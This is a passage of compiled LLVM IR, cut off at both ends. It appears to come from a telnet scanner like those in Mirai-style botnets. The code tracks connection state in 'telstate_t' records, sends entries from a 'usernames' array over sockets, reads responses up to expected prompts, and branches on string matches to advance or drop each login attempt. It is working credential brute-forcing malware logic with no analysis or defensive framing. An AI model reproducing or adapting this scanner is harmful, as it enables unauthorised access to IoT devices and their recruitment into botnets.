  %648 = call i8* @strstr(i8* %647, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %649 = icmp ne i8* %648, null
  br i1 %649, label %650, label %655

650:                                              ; preds = %634
  %651 = load i32, i32* %2, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %653, i32 0, i32 2
  store i8 5, i8* %654, align 8
  br label %661

655:                                              ; preds = %634
  %656 = load i32, i32* %2, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %658, i32 0, i32 8
  %660 = load i8*, i8** %659, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %660, i8 0, i64 1024, i1 false)
  br label %661

661:                                              ; preds = %655, %650
  %662 = load i32, i32* %2, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %664, i32 0, i32 2
  store i8 3, i8* %665, align 8
  br label %2271

666:                                              ; preds = %615
  %667 = load i32, i32* %2, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %669, i32 0, i32 8
  %671 = load i8*, i8** %670, align 8
  %672 = call i64 @strlen(i8* %671) #11
  %673 = trunc i64 %672 to i16
  %674 = load i32, i32* %2, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %676, i32 0, i32 7
  store i16 %673, i16* %677, align 16
  br label %678

678:                                              ; preds = %666
  br label %679

679:                                              ; preds = %678
  br label %680

680:                                              ; preds = %679
  br label %681

681:                                              ; preds = %680
  br label %682

682:                                              ; preds = %681
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %685, i32 0, i32 6
  %687 = load i32, i32* %686, align 4
  %688 = add i32 %687, 10
  %689 = zext i32 %688 to i64
  %690 = call i64 @time(i64* null) #12
  %691 = icmp slt i64 %689, %690
  br i1 %691, label %692, label %707

692:                                              ; preds = %682
  %693 = load i32, i32* %2, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 16
  %698 = call i32 @sclose(i32 %697)
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %701, i32 0, i32 2
  store i8 0, i8* %702, align 8
  %703 = load i32, i32* %2, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %704
  %706 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %705, i32 0, i32 3
  store i8 1, i8* %706, align 1
  br label %707

707:                                              ; preds = %692, %682
  br label %2270

708:                                              ; preds = %69
  %709 = load i32, i32* %2, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %711, i32 0, i32 0
  %713 = load i32, i32* %712, align 16
  %714 = load i32, i32* %2, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %716, i32 0, i32 4
  %718 = load i8, i8* %717, align 2
  %719 = zext i8 %718 to i64
  %720 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %719
  %721 = load i8*, i8** %720, align 8
  %722 = load i32, i32* %2, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %724, i32 0, i32 4
  %726 = load i8, i8* %725, align 2
  %727 = zext i8 %726 to i64
  %728 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %727
  %729 = load i8*, i8** %728, align 8
  %730 = call i64 @strlen(i8* %729) #11
  %731 = call i64 @send(i32 %713, i8* %721, i64 %730, i32 16384)
  %732 = icmp slt i64 %731, 0
  br i1 %732, label %733, label %748

733:                                              ; preds = %708
  %734 = load i32, i32* %2, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %736, i32 0, i32 0
  %738 = load i32, i32* %737, align 16
  %739 = call i32 @sclose(i32 %738)
  %740 = load i32, i32* %2, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %742, i32 0, i32 2
  store i8 0, i8* %743, align 8
  %744 = load i32, i32* %2, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %745
  %747 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %746, i32 0, i32 3
  store i8 1, i8* %747, align 1
  br label %2271

748:                                              ; preds = %708
  %749 = load i32, i32* %2, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %750
  %752 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %751, i32 0, i32 0
  %753 = load i32, i32* %752, align 16
  %754 = call i64 @send(i32 %753, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384)
  %755 = icmp slt i64 %754, 0
  br i1 %755, label %756, label %771

756:                                              ; preds = %748
  %757 = load i32, i32* %2, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %759, i32 0, i32 0
  %761 = load i32, i32* %760, align 16
  %762 = call i32 @sclose(i32 %761)
  %763 = load i32, i32* %2, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %764
  %766 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %765, i32 0, i32 2
  store i8 0, i8* %766, align 8
  %767 = load i32, i32* %2, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %769, i32 0, i32 3
  store i8 1, i8* %770, align 1
  br label %2271

771:                                              ; preds = %748
  %772 = load i32, i32* %2, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %774, i32 0, i32 2
  store i8 4, i8* %775, align 8
  br label %2270

776:                                              ; preds = %69
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %779, i32 0, i32 6
  %781 = load i32, i32* %780, align 4
  %782 = icmp eq i32 %781, 0
  br i1 %782, label %783, label %790

783:                                              ; preds = %776
  %784 = call i64 @time(i64* null) #12
  %785 = trunc i64 %784 to i32
  %786 = load i32, i32* %2, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %787
  %789 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %788, i32 0, i32 6
  store i32 %785, i32* %789, align 4
  br label %790

790:                                              ; preds = %783, %776
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %793, i32 0, i32 0
  %795 = load i32, i32* %794, align 16
  %796 = load i32, i32* %2, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %798, i32 0, i32 8
  %800 = load i8*, i8** %799, align 8
  %801 = load i32, i32* %2, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %803, i32 0, i32 7
  %805 = load i16, i16* %804, align 16
  %806 = zext i16 %805 to i32
  %807 = call i32 @readUntil(i32 %795, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %800, i32 1024, i32 %806)
  %808 = icmp ne i32 %807, 0
  br i1 %808, label %809, label %841

809:                                              ; preds = %790
  %810 = load i32, i32* %2, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %812, i32 0, i32 6
  store i32 0, i32* %813, align 4
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %816, i32 0, i32 7
  store i16 0, i16* %817, align 16
  %818 = load i32, i32* %2, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %820, i32 0, i32 8
  %822 = load i8*, i8** %821, align 8
  %823 = call i8* @strstr(i8* %822, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #11
  %824 = icmp ne i8* %823, null
  br i1 %824, label %825, label %830

825:                                              ; preds = %809
  %826 = load i32, i32* %2, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %828, i32 0, i32 2
  store i8 5, i8* %829, align 8
  br label %835

830:                                              ; preds = %809
  %831 = load i32, i32* %2, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %832
  %834 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %833, i32 0, i32 2
  store i8 7, i8* %834, align 8
  br label %835

835:                                              ; preds = %830, %825
  %836 = load i32, i32* %2, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %838, i32 0, i32 8
  %840 = load i8*, i8** %839, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %840, i8 0, i64 1024, i1 false)
  br label %2271

841:                                              ; preds = %790
  %842 = load i32, i32* %2, align 4
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %843
  %845 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %844, i32 0, i32 0
  %846 = load i32, i32* %845, align 16
  %847 = load i32, i32* %2, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %849, i32 0, i32 8
  %851 = load i8*, i8** %850, align 8
  %852 = load i32, i32* %2, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %854, i32 0, i32 7
  %856 = load i16, i16* %855, align 16
  %857 = zext i16 %856 to i32
  %858 = call i32 @readUntil(i32 %846, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %851, i32 1024, i32 %857)
  %859 = icmp ne i32 %858, 0
  br i1 %859, label %860, label %892

860:                                              ; preds = %841
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %863, i32 0, i32 6
  store i32 0, i32* %864, align 4
  %865 = load i32, i32* %2, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %866
  %868 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %867, i32 0, i32 7
  store i16 0, i16* %868, align 16
  %869 = load i32, i32* %2, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %871, i32 0, i32 8
  %873 = load i8*, i8** %872, align 8
  %874 = call i8* @strstr(i8* %873, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0)) #11
  %875 = icmp ne i8* %874, null
  br i1 %875, label %876, label %881

876:                                              ; preds = %860
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %879, i32 0, i32 2
  store i8 5, i8* %880, align 8
  br label %886

881:                                              ; preds = %860
  %882 = load i32, i32* %2, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %884, i32 0, i32 2
  store i8 7, i8* %885, align 8
  br label %886

886:                                              ; preds = %881, %876
  %887 = load i32, i32* %2, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %889, i32 0, i32 8
  %891 = load i8*, i8** %890, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %891, i8 0, i64 1024, i1 false)
  br label %2271

892:                                              ; preds = %841
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %895, i32 0, i32 8
  %897 = load i8*, i8** %896, align 8
  %898 = call i8* @strstr(i8* %897, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #11
  %899 = icmp ne i8* %898, null
  br i1 %899, label %900, label %915

900:                                              ; preds = %892
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %903, i32 0, i32 0
  %905 = load i32, i32* %904, align 16
  %906 = call i32 @sclose(i32 %905)
  %907 = load i32, i32* %2, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %908
  %910 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %909, i32 0, i32 2
  store i8 0, i8* %910, align 8
  %911 = load i32, i32* %2, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %913, i32 0, i32 3
  store i8 0, i8* %914, align 1
  br label %2271

915:                                              ; preds = %892
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %918 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %918, i32 0, i32 8
  %920 = load i8*, i8** %919, align 8
  %921 = call i8* @strstr(i8* %920, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #11
  %922 = icmp ne i8* %921, null
  br i1 %922, label %923, label %938

923:                                              ; preds = %915
  %924 = load i32, i32* %2, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %926, i32 0, i32 0
  %928 = load i32, i32* %927, align 16
  %929 = call i32 @sclose(i32 %928)
  %930 = load i32, i32* %2, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %932, i32 0, i32 2
  store i8 0, i8* %933, align 8
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %936, i32 0, i32 3
  store i8 0, i8* %937, align 1
  br label %2271

938:                                              ; preds = %915
  %939 = load i32, i32* %2, align 4
  %940 = sext i32 %939 to i64
  %941 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %940
  %942 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %941, i32 0, i32 8
  %943 = load i8*, i8** %942, align 8
  %944 = call i8* @strstr(i8* %943, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #11
  %945 = icmp ne i8* %944, null
  br i1 %945, label %946, label %961

946:                                              ; preds = %938
  %947 = load i32, i32* %2, align 4
  %948 = sext i32 %947 to i64
  %949 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %948
  %950 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %949, i32 0, i32 0
  %951 = load i32, i32* %950, align 16
  %952 = call i32 @sclose(i32 %951)
  %953 = load i32, i32* %2, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %955, i32 0, i32 2
  store i8 0, i8* %956, align 8
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %959, i32 0, i32 3
  store i8 0, i8* %960, align 1
  br label %2271

961:                                              ; preds = %938
  %962 = load i32, i32* %2, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %964, i32 0, i32 8
  %966 = load i8*, i8** %965, align 8
  %967 = call i8* @strstr(i8* %966, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #11
  %968 = icmp ne i8* %967, null
  br i1 %968, label %969, label %984

969:                                              ; preds = %961
  %970 = load i32, i32* %2, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %971
  %973 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %972, i32 0, i32 0
  %974 = load i32, i32* %973, align 16
  %975 = call i32 @sclose(i32 %974)
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %978, i32 0, i32 2
  store i8 0, i8* %979, align 8
  %980 = load i32, i32* %2, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %982, i32 0, i32 3
  store i8 0, i8* %983, align 1
  br label %2271

984:                                              ; preds = %961
  %985 = load i32, i32* %2, align 4
  %986 = sext i32 %985 to i64
  %987 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %986
  %988 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %987, i32 0, i32 8
  %989 = load i8*, i8** %988, align 8
  %990 = call i8* @strstr(i8* %989, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #11
  %991 = icmp ne i8* %990, null
  br i1 %991, label %992, label %1007

992:                                              ; preds = %984
  %993 = load i32, i32* %2, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %994
  %996 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %995, i32 0, i32 0
  %997 = load i32, i32* %996, align 16
  %998 = call i32 @sclose(i32 %997)
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1001, i32 0, i32 2
  store i8 0, i8* %1002, align 8
  %1003 = load i32, i32* %2, align 4
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1004
  %1006 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1005, i32 0, i32 3
  store i8 0, i8* %1006, align 1
  br label %2271

1007:                                             ; preds = %984
  %1008 = load i32, i32* %2, align 4
  %1009 = sext i32 %1008 to i64
  %1010 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1009
  %1011 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1010, i32 0, i32 8
  %1012 = load i8*, i8** %1011, align 8
  %1013 = call i8* @strstr(i8* %1012, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #11
  %1014 = icmp ne i8* %1013, null
  br i1 %1014, label %1015, label %1030

1015:                                             ; preds = %1007
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1018, i32 0, i32 0
  %1020 = load i32, i32* %1019, align 16
  %1021 = call i32 @sclose(i32 %1020)
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1024, i32 0, i32 2
  store i8 0, i8* %1025, align 8
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1028, i32 0, i32 3
  store i8 0, i8* %1029, align 1
  br label %2271

1030:                                             ; preds = %1007
  %1031 = load i32, i32* %2, align 4
  %1032 = sext i32 %1031 to i64
  %1033 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1033, i32 0, i32 8
  %1035 = load i8*, i8** %1034, align 8
  %1036 = call i8* @strstr(i8* %1035, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #11
  %1037 = icmp ne i8* %1036, null
  br i1 %1037, label %1038, label %1053

1038:                                             ; preds = %1030
  %1039 = load i32, i32* %2, align 4
  %1040 = sext i32 %1039 to i64
  %1041 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1040
  %1042 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1041, i32 0, i32 0
  %1043 = load i32, i32* %1042, align 16
  %1044 = call i32 @sclose(i32 %1043)
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1047, i32 0, i32 2
  store i8 0, i8* %1048, align 8
  %1049 = load i32, i32* %2, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1051, i32 0, i32 3
  store i8 0, i8* %1052, align 1
  br label %2271

1053:                                             ; preds = %1030
  %1054 = load i32, i32* %2, align 4
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1055
  %1057 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1056, i32 0, i32 8
  %1058 = load i8*, i8** %1057, align 8
  %1059 = call i8* @strstr(i8* %1058, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #11
  %1060 = icmp ne i8* %1059, null
  br i1 %1060, label %1061, label %1076

1061:                                             ; preds = %1053
  %1062 = load i32, i32* %2, align 4
  %1063 = sext i32 %1062 to i64
  %1064 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1063
  %1065 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1064, i32 0, i32 0
  %1066 = load i32, i32* %1065, align 16
  %1067 = call i32 @sclose(i32 %1066)
  %1068 = load i32, i32* %2, align 4
  %1069 = sext i32 %1068 to i64
  %1070 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1069
  %1071 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1070, i32 0, i32 2
  store i8 0, i8* %1071, align 8
  %1072 = load i32, i32* %2, align 4
  %1073 = sext i32 %1072 to i64
  %1074 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1073
  %1075 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1074, i32 0, i32 3
  store i8 0, i8* %1075, align 1
  br label %2271

1076:                                             ; preds = %1053
  %1077 = load i32, i32* %2, align 4
  %1078 = sext i32 %1077 to i64
  %1079 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1078
  %1080 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1079, i32 0, i32 8
  %1081 = load i8*, i8** %1080, align 8
  %1082 = call i8* @strstr(i8* %1081, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #11
  %1083 = icmp ne i8* %1082, null
  br i1 %1083, label %1084, label %1099

1084:                                             ; preds = %1076
  %1085 = load i32, i32* %2, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1086
  %1088 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1087, i32 0, i32 0
  %1089 = load i32, i32* %1088, align 16
  %1090 = call i32 @sclose(i32 %1089)
  %1091 = load i32, i32* %2, align 4
  %1092 = sext i32 %1091 to i64
  %1093 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1092
  %1094 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1093, i32 0, i32 2
  store i8 0, i8* %1094, align 8
  %1095 = load i32, i32* %2, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1096
